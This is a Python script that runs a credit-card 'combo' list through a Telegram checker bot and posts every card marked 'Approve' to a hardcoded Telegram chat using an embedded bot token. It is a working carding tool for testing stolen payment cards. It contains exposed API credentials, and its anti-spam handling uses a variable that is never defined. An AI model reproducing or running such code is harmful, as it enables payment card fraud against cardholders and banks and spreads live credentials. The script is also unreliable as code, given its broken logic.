#TDP_SAKKY
import os
try :
    import pyfiglet
    import telethon
    import requests
except:
    os.system('pip3 install pyfiglet')
    os.system('pip3 install telethon')
    os.system('pip3 install requests')
import time,os,random
from telethon import TelegramClient
from telethon import TelegramClient, events, sync
from telethon.tl.functions.messages import GetHistoryRequest, GetBotCallbackAnswerRequest
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
ch = "@one_me_not_bot"
api_id = "20075117"
api_hash = "e1753986de434132c0eb407b552a9d0d"
ID = "-4021142126"
token= "6593444388:AAETnvOz4z0NEjp9JdMv7nDvtK8pIzaJf2U"
combo = input(X+'ENTER YOU COMBO NAME : '+F)
os.system('clear')
client = TelegramClient('session', api_id, api_hash)
client.start()
for cc in open(combo,"r").read().split("\n"):
    try:
        client.send_message(ch ,f"/an {cc}")
        time.sleep(random.randint(40,45))
        mssag = client.get_messages(ch, limit=1)
        if "ANTI_SPAM" in str(mssag[0].message):
            r = str(mssag[0].message).split("again after ")[1]
            r = t.split("seconds")[0]
            r = int(t)
            print(f"Done Sleep : {r+2}")
            time.sleep(t+1)
        ccn = mssag[0].message
        if 'Approve' in ccn :
            print(F+'Approved✅ | RINAOP : @rinashaikh17.')
            mgs=f'''• Card checked by @RINASHAIKH17✅.
{ccn} .
@RINASHAIKH17✔️'''
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={mgs}"
            i = requests.post(tlg)
            time.sleep(1)
        else :
            print(Z+'Declined❌ | REENAOP : @REENASHAIKH17.')
    except:
        print(False)
        #@TDP_SAKKY